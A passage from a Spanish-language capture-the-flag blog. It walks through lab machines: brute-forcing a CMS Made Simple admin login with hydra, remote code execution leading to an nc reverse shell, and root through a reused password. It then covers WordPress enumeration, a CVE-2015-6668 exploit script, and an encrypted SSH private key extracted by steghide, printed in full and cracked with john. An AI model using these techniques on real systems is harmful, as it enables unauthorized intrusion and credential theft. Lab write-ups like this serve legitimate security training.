Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-12-09 00:52 CST
Nmap scan report <span class="k">for </span>172.17.0.2
Host is up <span class="o">(</span>0.000032s latency<span class="o">)</span><span class="nb">.</span>

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   256 d1:19:f1:fa:48:16:af:8a:4a:89:2d:78:89:e9:2d:94 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 b8:b7:2e:64:3e:ee:c3:2e:2e:be:99:07:4e:02:4f:16 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.52 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.52 <span class="o">(</span>Ubuntu<span class="o">)</span>
MAC Address: 02:42:AC:11:00:02 <span class="o">(</span>Unknown<span class="o">)</span>
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>Estas son las tecnologías que esta usando la pagina web.</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">❯</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">172.17</span><span class="o">.</span><span class="mf">0.2</span>
<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">172.17</span><span class="o">.</span><span class="mf">0.2</span> <span class="p">[</span><span class="mi">200</span> <span class="no">OK</span><span class="p">]</span> <span class="no">Apache</span><span class="p">[</span><span class="mf">2.4</span><span class="o">.</span><span class="mi">52</span><span class="p">],</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="no">Ubuntu</span> <span class="no">Linux</span><span class="p">][</span><span class="no">Apache</span><span class="o">/</span><span class="mf">2.4</span><span class="o">.</span><span class="mi">52</span> <span class="p">(</span><span class="no">Ubuntu</span><span class="p">)],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">172.17</span><span class="o">.</span><span class="mf">0.2</span><span class="p">],</span> <span class="no">Title</span><span class="p">[</span><span class="no">Apache2</span> <span class="no">Ubuntu</span> <span class="no">Default</span> <span class="no">Page</span><span class="p">:</span> <span class="no">It</span> <span class="n">works</span><span class="p">]</span>
</code></pre></div></div>

<ul>
  <li>Esta es la página web.</li>
</ul>

<p align="center">
<img src="/assets/DockerLabs/SummerVibes/2.png" />
</p>

<ul>
  <li>Vamos hacer <code class="language-plaintext highlighter-rouge">Fuzzing</code> para buscar alguna ruta interesante.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://172.17.0.2 <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt <span class="nt">-t</span> 40
<span class="o">===============================================================</span>
Gobuster v3.6
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+] Url:                     http://172.17.0.2
<span class="o">[</span>+] Method:                  GET
<span class="o">[</span>+] Threads:                 40
<span class="o">[</span>+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
<span class="o">[</span>+] Negative Status codes:   404
<span class="o">[</span>+] User Agent:              gobuster/3.6
<span class="o">[</span>+] Timeout:                 10s
<span class="o">===============================================================</span>
Starting gobuster <span class="k">in </span>directory enumeration mode
<span class="o">===============================================================</span>
/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 275]
Progress: 220559 / 220560 <span class="o">(</span>100.00%<span class="o">)</span>
<span class="o">===============================================================</span>
Finished
<span class="o">===============================================================</span>
</code></pre></div></div>

<ul>
  <li>Si analizamos el código fuente de la pagina web encontramos esto que es interesante.</li>
</ul>

<p align="center">
<img src="/assets/DockerLabs/SummerVibes/3.png" />
</p>

<ul>
  <li>Vemos que tenemos un <code class="language-plaintext highlighter-rouge">CMS</code> <a href="https://www.cmsmadesimple.org/">https://www.cmsmadesimple.org/</a>.</li>
</ul>

<p align="center">
<img src="/assets/DockerLabs/SummerVibes/4.png" />
</p>

<ul>
  <li>Aquí podemos ver la versión.</li>
</ul>

<p align="center">
<img src="/assets/DockerLabs/SummerVibes/5.png" />
</p>

<ul>
  <li>Tenemos varias rutas.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://172.17.0.2/cmsms <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt <span class="nt">-t</span> 40
<span class="o">===============================================================</span>
Gobuster v3.6
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+] Url:                     http://172.17.0.2/cmsms
<span class="o">[</span>+] Method:                  GET
<span class="o">[</span>+] Threads:                 40
<span class="o">[</span>+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
<span class="o">[</span>+] Negative Status codes:   404
<span class="o">[</span>+] User Agent:              gobuster/3.6
<span class="o">[</span>+] Timeout:                 10s
<span class="o">===============================================================</span>
Starting gobuster <span class="k">in </span>directory enumeration mode
<span class="o">===============================================================</span>
/modules              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 316] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://172.17.0.2/cmsms/modules/]
/uploads              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 316] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://172.17.0.2/cmsms/uploads/]
/doc                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 312] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://172.17.0.2/cmsms/doc/]
/admin                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 314] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://172.17.0.2/cmsms/admin/]
/assets               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 315] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://172.17.0.2/cmsms/assets/]
/lib                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 312] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://172.17.0.2/cmsms/lib/]
/tmp                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 312] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://172.17.0.2/cmsms/tmp/]
</code></pre></div></div>

<ul>
  <li>Encontramos un panel de login.</li>
</ul>

<p align="center">
<img src="/assets/DockerLabs/SummerVibes/6.png" />
</p>

<ul>
  <li>
    <p>Vemos que el username por defecto es admin pero no sabemos la contraseña podemos hacer un ataque de fuerza bruta al panel para ver si la contraseña esta en algún diccionario <a href="https://sitemagic.org/sites/cms-guide/How-to-log-in.html#:~:text=The%20default%20username%20is%20admin,password%20immediately%20after%20log%20in!">https://sitemagic.org/sites/cms-guide/How-to-log-in.html#:~:text=The%20default%20username%20is%20admin,password%20immediately%20after%20log%20in!</a>.</p>
  </li>
  <li>
    <p>Capturamos la petición para ver como se tramita la petición.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/DockerLabs/SummerVibes/7.png" />
</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ hydra <span class="nt">-l</span> admin <span class="nt">-P</span> /usr/share/wordlists/rockyou.txt 172.17.0.2 http-post-form <span class="s2">"/cmsms/admin/login.php:username=^USER^&amp;password=^PASS^&amp;&amp;loginsubmit=Submit:User name or password incorrect"</span> <span class="nt">-VI</span>
</code></pre></div></div>

<ul>
  <li>Después de varios intentos encontramos las credenciales.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>80][http-post-form] host: 172.17.0.2   login: admin   password: chocolate
</code></pre></div></div>

<ul>
  <li>Podemos entrar.</li>
</ul>

<p align="center">
<img src="/assets/DockerLabs/SummerVibes/8.png" />
</p>

<h2 id="shell-as-www-data">Shell as www-data</h2>

<ul>
  <li>
    <p>Si buscamos por vulnerabilidades encontramos la siguiente <a href="https://github.com/capture0x/CMSMadeSimple">https://github.com/capture0x/CMSMadeSimple</a> la versión que esta usando es vulnerable a Remote Code Execution.</p>
  </li>
  <li>
    <p>Nos dan los pasos para explotar la vulnerabilidad en este caso tenemos que ir a User Defined Tags.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/DockerLabs/SummerVibes/9.png" />
</p>

<ul>
  <li>
    <p>Vamos a darle en Add.</p>
  </li>
  <li>
    <p>Vamos a comprobar que se ejecutan los comandos.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/DockerLabs/SummerVibes/10.png" />
</p>

<ul>
  <li>Ahora le damos click al tag y le damos en RUN.</li>
</ul>

<p align="center">
<img src="/assets/DockerLabs/SummerVibes/11.png" />
</p>

<ul>
  <li>Y funciona.</li>
</ul>

<p align="center">
<img src="/assets/DockerLabs/SummerVibes/12.png" />
</p>

<ul>
  <li>Ahora nos vamos a enviar una reverse shell.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
</code></pre></div></div>

<p align="center">
<img src="/assets/DockerLabs/SummerVibes/14.png" />
</p>

<blockquote>
  <p>Hay que poner un nombre bien el de la imagen te dará error -&gt; RUN.</p>
</blockquote>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>192.168.1.65] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>172.17.0.2] 49072
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>25<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
www-data@fc2f986ff0d9:/var/www/html/cmsms/admin<span class="nv">$ </span>script /dev/null <span class="nt">-c</span> bash
CTRL+Z
❯ <span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span><span class="nb">fg</span>
<span class="o">[</span>1]  + continued  nc <span class="nt">-nlvp</span> 443
                              reset xterm
ENTER
www-data@fc2f986ff0d9:/var/www/html/cmsms/admin<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
</code></pre></div></div>

<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>

<ul>
  <li>Bueno al parecer después de enumerar root usa la contraseña chocolate que encontramos al principio.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@fc2f986ff0d9:/<span class="nv">$ </span>su root
Password: 
root@fc2f986ff0d9:/#
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="DockerLabs/machines/hard" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Tenten (medium)</title><link href="http://localhost:4000/hackthebox/machines/medium/2024/11/02/tenten.html" rel="alternate" type="text/html" title="HackTheBox - Tenten (medium)" /><published>2024-11-02T00:00:00-06:00</published><updated>2024-11-02T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/medium/2024/11/02/tenten</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/medium/2024/11/02/tenten.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/e58a465e93364c423cd2162945f8f7bf.png" />
</p>

<ul>
  <li>Tenten is a medium difficulty machine that requires some outside-the-box/CTF-style thinking to complete. It demonstrates the severity of using outdated Wordpress plugins, which is a major attack vector that exists in real life.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80 10.10.10.10 <span class="nt">-oG</span> allPorts
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-11-02 18:57 CST
Nmap scan report <span class="k">for </span>10.10.10.10
Host is up <span class="o">(</span>0.18s latency<span class="o">)</span><span class="nb">.</span>

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 ec:f7:9d:38:0c:47:6f:f0:13:0f:b9:3b:d4:d6:e3:11 <span class="o">(</span>RSA<span class="o">)</span>
|   256 cc:fe:2d:e2:7f:ef:4d:41:ae:39:0e:91:ed:7e:9d:e7 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 8d:b5:83:18:c0:7c:5d:3d:38:df:4b:e1:a4:82:8a:07 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.18
|_http-title: Did not follow redirect to http://tenten.htb/
|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
Service Info: Host: 127.0.1.1<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>Tenemos un subdominio vamos agregarlo al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">echo</span> <span class="s2">"10.10.10.10 tenten.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
10.10.10.10 tenten.htb
</code></pre></div></div>

<ul>
  <li>También lo pudimos haber visto de esta forma.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="nt">-I</span> http://10.10.10.10
HTTP/1.1 301 Moved Permanently
Date: Sun, 03 Nov 2024 00:59:56 GMT
Server: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
Location: http://tenten.htb/
Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>iso-8859-1
</code></pre></div></div>

<ul>
  <li>Tenemos un <code class="language-plaintext highlighter-rouge">WordPress</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/tenten/1.png" />
</p>

<ul>
  <li>Es un <code class="language-plaintext highlighter-rouge">WordPress</code> de versión <code class="language-plaintext highlighter-rouge">4.7.3</code>.</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">❯</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="n">tenten</span><span class="p">.</span><span class="nf">htb</span>
<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="n">tenten</span><span class="p">.</span><span class="nf">htb</span> <span class="p">[</span><span class="mi">200</span> <span class="no">OK</span><span class="p">]</span> <span class="no">Apache</span><span class="p">[</span><span class="mf">2.4</span><span class="o">.</span><span class="mi">18</span><span class="p">],</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">HTML5</span><span class="p">,</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="no">Ubuntu</span> <span class="no">Linux</span><span class="p">][</span><span class="no">Apache</span><span class="o">/</span><span class="mf">2.4</span><span class="o">.</span><span class="mi">18</span> <span class="p">(</span><span class="no">Ubuntu</span><span class="p">)],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.10</span><span class="p">],</span> <span class="no">JQuery</span><span class="p">[</span><span class="mf">1.12</span><span class="o">.</span><span class="mi">4</span><span class="p">],</span> <span class="no">MetaGenerator</span><span class="p">[</span><span class="no">WordPress</span> <span class="mf">4.7</span><span class="o">.</span><span class="mi">3</span><span class="p">],</span> <span class="no">PoweredBy</span><span class="p">[</span><span class="no">WordPress</span><span class="p">,</span><span class="no">WordPress</span><span class="p">,],</span> <span class="no">Script</span><span class="p">[</span><span class="n">text</span><span class="o">/</span><span class="n">javascript</span><span class="p">],</span> <span class="no">Title</span><span class="p">[</span><span class="no">Job</span> <span class="no">Portal</span> <span class="o">&amp;</span><span class="c1">#8211; Just another WordPress site], UncommonHeaders[link], WordPress[4.7.3]</span>
</code></pre></div></div>

<ul>
  <li>Comenzamos enumerando usuarios <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress#active-enumeration">https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress#active-enumeration</a> siguiente instrucciones vemos que si lanzamos una petición al <code class="language-plaintext highlighter-rouge">id</code> <code class="language-plaintext highlighter-rouge">1</code> nos responde con un <code class="language-plaintext highlighter-rouge">301</code> pero nos da el nombre de un usuario llamado <code class="language-plaintext highlighter-rouge">takis</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="nt">-s</span> <span class="nt">-I</span> <span class="nt">-X</span> GET <span class="s1">'http://tenten.htb/?author=1'</span>
HTTP/1.1 301 Moved Permanently
Date: Sun, 03 Nov 2024 01:05:04 GMT
Server: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
Location: http://tenten.htb/index.php/author/takis/
Content-Length: 0
Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
</code></pre></div></div>

<ul>
  <li>Vamos a usar la herramienta <code class="language-plaintext highlighter-rouge">wpscan</code> para escanear el <code class="language-plaintext highlighter-rouge">Wordpress</code> y encontrar ya sea <code class="language-plaintext highlighter-rouge">themes</code>, <code class="language-plaintext highlighter-rouge">plugins</code> y mas usuarios.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wpscan <span class="nt">--url</span> http://10.10.10.10 <span class="nt">-e</span> ap,t,tt,u
</code></pre></div></div>

<ul>
  <li>Encontramos un Plugin.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>i] Plugin<span class="o">(</span>s<span class="o">)</span> Identified:

<span class="o">[</span>+] job-manager
 | Location: http://tenten.htb/wp-content/plugins/job-manager/
 | Latest Version: 0.7.25 <span class="o">(</span>up to <span class="nb">date</span><span class="o">)</span>
 | Last Updated: 2015-08-25T22:44:00.000Z
 |
 | Found By: Urls In Homepage <span class="o">(</span>Passive Detection<span class="o">)</span>
 |
 | Version: 7.2.5 <span class="o">(</span>80% confidence<span class="o">)</span>
 | Found By: Readme - Stable Tag <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 |  - http://tenten.htb/wp-content/plugins/job-manager/readme.txt
</code></pre></div></div>

<ul>
  <li>Encontramos el <code class="language-plaintext highlighter-rouge">theme</code> en uso.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>+] WordPress theme <span class="k">in </span>use: twentyseventeen
 | Location: http://tenten.htb/wp-content/themes/twentyseventeen/
 | Last Updated: 2024-07-16T00:00:00.000Z
 | Readme: http://tenten.htb/wp-content/themes/twentyseventeen/README.txt
 | <span class="o">[!]</span> The version is out of <span class="nb">date</span>, the latest version is 3.7
 | Style URL: http://tenten.htb/wp-content/themes/twentyseventeen/style.css?ver<span class="o">=</span>4.7.3
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage <span class="o">(</span>Passive Detection<span class="o">)</span>
 |
 | Version: 1.1 <span class="o">(</span>80% confidence<span class="o">)</span>
 | Found By: Style <span class="o">(</span>Passive Detection<span class="o">)</span>
 |  - http://tenten.htb/wp-content/themes/twentyseventeen/style.css?ver<span class="o">=</span>4.7.3, Match: <span class="s1">'Version: 1.1'</span>
</code></pre></div></div>

<ul>
  <li>
    <p>Si buscamos en internet tiene vulnerabilidades <a href="https://github.com/jimdiroffii/CVE-2015-6668">https://github.com/jimdiroffii/CVE-2015-6668</a>.</p>
  </li>
  <li>
    <p>El Plugin <code class="language-plaintext highlighter-rouge">WP Job Manager</code> es popular en <code class="language-plaintext highlighter-rouge">WordPress</code> ya que se utiliza para gestionar ofertas de empleo en sitios web.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/tenten/2.png" />
</p>

<ul>
  <li>Si le damos en <code class="language-plaintext highlighter-rouge">Apply Now</code> nos pide datos.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/tenten/3.png" />
</p>

<ul>
  <li>Basándonos en el GitHub vamos a iterar el numero para ver la respuesta que obtenemos.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/tenten/4.png" />
</p>

<ul>
  <li>Si vamos a la petición 13 vemos que obtenemos un nombre raro en el <code class="language-plaintext highlighter-rouge">Job Application</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/tenten/5.png" />
</p>

<ul>
  <li>Básicamente en esa parte se suben <code class="language-plaintext highlighter-rouge">CV</code> y si usamos el script y le pasamos el nombre del <code class="language-plaintext highlighter-rouge">Title</code> vemos que nos reporta esto, esta vulnerabilidad nos permite filtrar títulos de publicaciones en la base de datos incluyendo cosas privadas es por eso que nos reporte una imagen.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 exploit.py

CVE-2015-6668
Title: CV filename disclosure on Job-Manager WP Plugin
Author: Evangelos Mourikis
Blog: https://vagmour.eu
Plugin URL: http://www.wp-jobmanager.com
Versions: &lt;<span class="o">=</span>0.7.25

Enter a vulnerable website: http://tenten.htb 
Enter a file name: HackerAccessGranted
<span class="o">[</span>+] URL of CV found! http://tenten.htb/wp-content/uploads/2017/04/HackerAccessGranted.jpg
</code></pre></div></div>

<ul>
  <li>Esta es la imagen.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/tenten/6.png" />
</p>

<ul>
  <li>Vamos a guardarla.</li>
</ul>

<h2 id="shell-as-takis">Shell as takis</h2>

<ul>
  <li>Con la herramienta <code class="language-plaintext highlighter-rouge">steghide</code> podemos ver información oculta si la usamos podemos observar que nos dicen sobre una <code class="language-plaintext highlighter-rouge">id_rsa</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ steghide info HackerAccessGranted.jpg
<span class="s2">"HackerAccessGranted.jpg"</span>:
  format: jpeg
  capacity: 15.2 KB
Try to get information about embedded data ? <span class="o">(</span>y/n<span class="o">)</span> y
Enter passphrase: 
  embedded file <span class="s2">"id_rsa"</span>:
    size: 1.7 KB
    encrypted: rijndael-128, cbc
    compressed: <span class="nb">yes</span>
</code></pre></div></div>

<ul>
  <li>Podemos extraerla.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ steghide extract <span class="nt">-sf</span>  HackerAccessGranted.jpg
Enter passphrase: 
wrote extracted data to <span class="s2">"id_rsa"</span><span class="nb">.</span>
</code></pre></div></div>

<ul>
  <li>La tenemos pero encriptada.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>id_rsa
<span class="nt">-----BEGIN</span> RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,7265FC656C429769E4C1EEFC618E660C

/HXcUBOT3JhzblH7uF9Vh7faa76XHIdr/Ch0pDnJunjdmLS/laq1kulQ3/RF/Vax
tjTzj/V5hBEcL5GcHv3esrODlS0jhML53lAprkpawfbvwbR+XxFIJuz7zLfd/vDo
1KuGrCrRRsipkyae5KiqlC137bmWK9aE/4c5X2yfVTOEeODdW0rAoTzGufWtThZf
K2ny0iTGPndD7LMdm/o5O5As+ChDYFNphV1XDgfDzHgonKMC4iES7Jk8Gz20PJsm
SdWCazF6pIEqhI4NQrnkd8kmKqzkpfWqZDz3+g6f49GYf97aM5TQgTday2oFqoXH
WPhK3Cm0tMGqLZA01+oNuwXS0H53t9FG7GqU31wj7nAGWBpfGodGwedYde4zlOBP
VbNulRMKOkErv/NCiGVRcK6k5Qtdbwforh+6bMjmKE6QvMXbesZtQ0gC9SJZ3lMT
J0IY838HQZgOsSw1jDrxuPV2DUIYFR0W3kQrDVUym0BoxOwOf/MlTxvrC2wvbHqw
AAniuEotb9oaz/Pfau3OO/DVzYkqI99VDX/YBIxd168qqZbXsM9s/aMCdVg7TJ1g
2gxElpV7U9kxil/RNdx5UASFpvFslmOn7CTZ6N44xiatQUHyV1NgpNCyjfEMzXMo
6FtWaVqbGStax1iMRC198Z0cRkX2VoTvTlhQw74rSPGPMEH+OSFksXp7Se/wCDMA
pYZASVxl6oNWQK+pAj5z4WhaBSBEr8ZVmFfykuh4lo7Tsnxa9WNoWXo6X0FSOPMk
tNpBbPPq15+M+dSZaObad9E/MnvBfaSKlvkn4epkB7n0VkO1ssLcecfxi+bWnGPm
KowyqU6iuF28w1J9BtowgnWrUgtlqubmk0wkf+l08ig7koMyT9KfZegR7oF92xE9
4IWDTxfLy75o1DH0Rrm0f77D4HvNC2qQ0dYHkApd1dk4blcb71Fi5WF1B3RruygF
2GSreByXn5g915Ya82uC3O+ST5QBeY2pT8Bk2D6Ikmt6uIlLno0Skr3v9r6JT5J7
L0UtMgdUqf+35+cA70L/wIlP0E04U0aaGpscDg059DL88dzvIhyHg4Tlfd9xWtQS
VxMzURTwEZ43jSxX94PLlwcxzLV6FfRVAKdbi6kACsgVeULiI+yAfPjIIyV0m1kv
5HV/bYJvVatGtmkNuMtuK7NOH8iE7kCDxCnPnPZa0nWoHDk4yd50RlzznkPna74r
Xbo9FdNeLNmER/7GGdQARkpd52Uur08fIJW2wyS1bdgbBgw/G+puFAR8z7ipgj4W
p9LoYqiuxaEbiD5zUzeOtKAKL/nfmzK82zbdPxMrv7TvHUSSWEUC4O9QKiB3amgf
yWMjw3otH+ZLnBmy/fS6IVQ5OnV6rVhQ7+LRKe+qlYidzfp19lIL8UidbsBfWAzB
9Xk0sH5c1NQT6spo/nQM3UNIkkn+a7zKPJmetHsO4Ob3xKLiSpw5f35SRV+rF+mO
vIUE1/YssXMO7TK6iBIXCuuOUtOpGiLxNVRIaJvbGmazLWCSyptk5fJhPLkhuK+J
YoZn9FNAuRiYFL3rw+6qol+KoqzoPJJek6WHRy8OSE+8Dz1ysTLIPB6tGKn7EWnP
<span class="nt">-----END</span> RSA PRIVATE KEY-----
</code></pre></div></div>

<ul>
  <li>Esta es la contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ /usr/share/john/ssh2john.py id_rsa <span class="o">&gt;</span> <span class="nb">hash</span>
❯ john <span class="nb">hash</span> <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>SSH, SSH private key <span class="o">[</span>RSA/DSA/EC/OPENSSH 32/64]<span class="o">)</span>
Cost 1 <span class="o">(</span>KDF/cipher <span class="o">[</span><span class="nv">0</span><span class="o">=</span>MD5/AES <span class="nv">1</span><span class="o">=</span>MD5/3DES <span class="nv">2</span><span class="o">=</span>Bcrypt/AES]<span class="o">)</span> is 0 <span class="k">for </span>all loaded hashes
Cost 2 <span class="o">(</span>iteration count<span class="o">)</span> is 1 <span class="k">for </span>all loaded hashes
Will run 2 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
superpassword    <span class="o">(</span>id_rsa<span class="o">)</span>     
1g 0:00:00:01 DONE <span class="o">(</span>2024-11-02 20:06<span class="o">)</span> 0.7462g/s 582113p/s 582113c/s 582113C/s superpene..supermoy
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed. 
</code></pre></div></div>

<h2 id="user-flag">User flag</h2>

<ul>
  <li>Vamos a conectarnos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">chmod </span>600 id_rsa
                                                                                                
❯ ssh <span class="nt">-i</span> id_rsa takis@10.10.10.10
The authenticity of host <span class="s1">'10.10.10.10 (10.10.10.10)'</span> can<span class="s1">'t be established.
ED25519 key fingerprint is SHA256:5a3db7g5K/KVQU7u9yholvmJI7kp3pWZj0qtGz4Yr9Q.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span>10.10.10.10<span class="s1">' (ED25519) to the list of known hosts.
Enter passphrase for key '</span>id_rsa<span class="s1">': 
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

65 packages can be updated.
39 updates are security updates.


Last login: Fri May  5 23:05:36 2017
